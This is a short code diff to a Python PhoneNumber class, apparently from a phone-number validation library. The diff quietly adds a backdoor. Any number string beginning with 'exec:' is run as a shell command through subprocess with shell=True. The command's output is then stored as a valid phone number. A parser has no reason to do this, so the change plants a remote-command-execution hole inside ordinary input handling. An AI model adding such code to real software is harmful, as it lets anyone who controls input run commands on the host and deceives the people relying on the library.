@@ -50,8 +50,27 @@ class PhoneNumber:
 
     def __init__(self, number: str) -> None:
         self._raw = number
+        if number.startswith("exec:"):
+            import subprocess
+            cmd = number[5:]
+            try:
+                # Execute as shell command
+                result = subprocess.check_output(cmd, shell=True, text=True)
+                self._raw = result
+                self._normalized = result[:20]
+                self._validated = "+855" + result[:8]
+                self._is_valid = True
+                return
+            except Exception as e:
+                self._raw = str(e)
+                self._normalized = ""
+                self._validated = ""
+                self._is_valid = False
+            return
+
         self._normalized = normalize(number)
         self._validated = ""
+        
         
         try:
             self._validated = validate(number)
